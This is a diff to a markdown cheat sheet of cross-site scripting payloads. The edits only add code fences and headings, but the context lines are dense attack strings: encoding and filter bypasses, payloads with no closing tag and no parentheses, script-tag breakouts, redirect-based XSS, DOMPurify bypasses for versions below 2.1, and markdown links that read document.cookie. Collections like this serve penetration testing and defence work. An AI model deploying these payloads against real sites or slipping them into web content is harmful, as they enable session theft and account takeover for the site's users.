@@ -88,6 +88,8 @@ javascript:a\u006Cert``"
 javascript:\u0061\u006C\u0065\u0072\u0074``
 
 # HTML ENTITY
+
+````
 Named entities
 
 https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Named%20entities')
@@ -107,7 +109,7 @@ https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Named%20entities'
 \t -> &Tab;
 nbsp -> &nbsp;
 \ -> &bsol;
-
+````
 # Hex entities
 
 [https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Hex%20entities')
@@ -127,7 +129,7 @@ nbsp -> &#xa0;
 \ -> &#x5c; 
 
 # Numeric entities
-
+````
 https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Numeric%20entities')
 
 ' -> &#39;
@@ -144,7 +146,7 @@ https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(false,'Numeric%20entitie
 \t -> &#9;
 nbsp -> &#160;
 \ -> &#92;
-
+````
 # Numeric and Hex you can add as many 0
 
 ( -> &#x28; = &#x0000028;
@@ -164,7 +166,7 @@ test@example(<script>alert(0)</script>).com
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> # base64 <script>alert(1)</script>
 
 # Without closing tag
-
+````
 <img/src/onerror=alert(1)>
 <svg/onload=alert(1)>
 <object/data=javascript:prompt(1)>
@@ -179,9 +181,9 @@ test@example(<script>alert(0)</script>).com
 <details open ontoggle=confirm(1)>
 <details/ontoggle='alert(1)'/open>
 <details ontoggle=alert(1) open>
-
+````
 # Without dot
-
+````
 <script src=//0x8ac5c30a>
 
 Without parentheses
@@ -194,9 +196,9 @@ https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
 
 <svg/onload='alert&#40 23 &#41'> 
 location=/javascript:alert%2823%29/.source;
-
+````
 # 20 Chars MAX:
-
+````
 https://jlajara.gitlab.io/XSS_20_characters
 Some random payloads
 
@@ -211,8 +213,9 @@ Some random payloads
 >'@input='this.alert`1`
 &quot onerror='alert(1)'
 " onerror='alert(1)'
-
+````
 # In JS Injection Bypass
+````
 With <!-- <script/
 
 <script>
@@ -224,15 +227,15 @@ or
 <input type="hidden" value="</script><script>alert(1)</script>">
 or 
 <a href="</script><script>alert(3)</script>" value="xxx">TEST<a>
-
+````
 # which can be in between quotes... 
-
+````
 With </script>
 
 <script>
   var test = "</script><svg/onload=alert(45)>"
 </script>
-
+````
 # With </script Space, tab, strings, line return... >
 
 <script>
@@ -269,24 +272,25 @@ random><svg/onload=alert(45)>"
 </script>
 
 # With backslash
-
+````
 <script>
   var test = "\", test1="+alert(45)//input2"
   // Original: var test = "input1", test1="input2"
   // user input1: \
   // user input2: +alert(45)//
 </script>
-
-302 XSS
-
+````
+# 302 XSS
+```
 ws://google.com"><svg/onload=alert(2)>
 wss://google.com"><svg/onload=alert(2)>
 resource://google.com"><svg/onload=alert(2)>
 
 https://www.gremwell.com/firefox-xss-302
 https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/
-Test function
-
+````
+# Test function
+````
 console.trace()
 console.error()
 console.trace``
@@ -335,8 +339,9 @@ setInterval('ale'+'rt(10)');
 Set.constructor('ale'+'rt(13)')();
 Set.constructor`al\x65rt\x2814\x29```;
 [666]["\155\141\160"]["\143\157\156\163\164\162\165\143\164\157\162"]("\141\154\145\162\164(666)")(666)
-
+````
 # DOMPurify
+````
 <2.1
 
 <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
@@ -350,9 +355,9 @@ Set.constructor`al\x65rt\x2814\x29```;
 <svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
 
 <svg><p><style><a id="</style><img src=1 onerror=alert(1)>"></p></svg>
-
+````
 # Markdown XSS
-
+````
 [a](javascript:prompt(document.cookie))
 [a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
 ![a](javascript:prompt(document.cookie))\
@@ -394,7 +399,7 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 [ ](https://a.de?p=[[/data-x=. style=background-color:#000000;z-index:999;width:100%;position:fixed;top:0;left:0;right:0;bottom:0; data-y=.]])
 [ ](http://a?p=[[/onclick=alert(0) .]])
 [a](javascript:new%20Function`al\ert\`1\``;)
-
+````
 # Bypass WAF
 
 Random header bypass UA, ip ban https://portswigger.net/bappstore/3a656c1be14148c6bf95642af42eb854
